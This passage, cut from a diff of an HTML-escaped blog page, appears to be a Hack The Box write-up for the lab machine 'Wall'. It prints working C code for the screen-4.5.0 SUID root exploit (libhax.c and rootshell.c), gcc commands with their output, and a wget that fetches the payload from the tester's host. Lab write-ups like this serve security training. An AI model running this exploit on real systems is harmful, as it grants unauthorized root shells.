+drwxr-xr-x  4 root       root       4096 Jul  4 00:38 .
+drwxr-xr-x 23 root       root       4096 Jul  4 00:25 ..
+drwxr-xr-x  6 shelby     shelby     4096 Jul 30 17:37 shelby
+drwxr-xr-x  5 sysmonitor sysmonitor 4096 Jul  6 15:07 sysmonitor
+www-data@Wall:/home$ cd shelby
+www-data@Wall:/home/shelby$ cat user.txt 
+cat: user.txt: Permission denied
+www-data@Wall:/home/shelby$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;I searched for &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; binaries and saw &lt;code class=&quot;highlighter-rouge&quot;&gt;screen-4.5.0&lt;/code&gt;, similar to the privesc in &lt;a href=&quot;/hack-the-box/flujab&quot;&gt;Flujab&lt;/a&gt; I used &lt;a href=&quot;https://www.exploit-db.com/exploits/41154&quot;&gt;this exploit&lt;/a&gt;. 
+&lt;br /&gt;The exploit script didn’t work properly so I did it manually, I compiled the binaries on my box:
+&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;libhax.c&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__attribute__&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__constructor__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dropshell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;chown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/rootshell&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;chmod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/rootshell&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;04755&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;unlink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/etc/ld.so.preload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] done!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rootshell.c&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;setuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;setgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;seteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;setegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;execvp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kali&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:~/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;boxes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;privesc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nano&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libhax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kali&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:~/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;boxes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;privesc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nano&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rootshell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kali&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:~/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;boxes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;privesc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gcc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fPIC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shared&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ldl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libhax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libhax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;libhax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;In&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;‘&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dropshell&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;libhax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;warning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;implicit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;declaration&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;‘&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chmod&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Wimplicit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;declaration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;chmod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/rootshell&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;04755&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;^~~~~&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kali&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:~/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;boxes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;privesc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gcc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rootshell&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rootshell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;rootshell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;In&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;‘&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;rootshell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;warning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;implicit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;declaration&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;‘&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setuid&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Wimplicit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;declaration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;setuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;^~~~~~&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;rootshell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;warning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;implicit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;declaration&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;‘&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setgid&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Wimplicit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;declaration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;setgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;^~~~~~&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;rootshell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;warning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;implicit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;declaration&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;‘&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seteuid&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Wimplicit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;declaration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;seteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;^~~~~~~&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;rootshell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;warning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;implicit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;declaration&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;‘&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setegid&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Wimplicit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;declaration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;setegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;^~~~~~~&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;rootshell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;warning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;implicit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;declaration&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;‘&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execvp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Wimplicit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;declaration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;execvp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;^~~~~~&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;rootshell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;warning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;too&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;many&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;built&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;‘&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execvp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;expecting&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Wbuiltin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;declaration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mismatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kali&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:~/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;boxes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;privesc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;Then I uploaded them to the box and did the rest of the exploit:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@Wall:/home/shelby$ cd /tmp/
+www-data@Wall:/tmp$ wget http://10.10.xx.xx/libhax.so
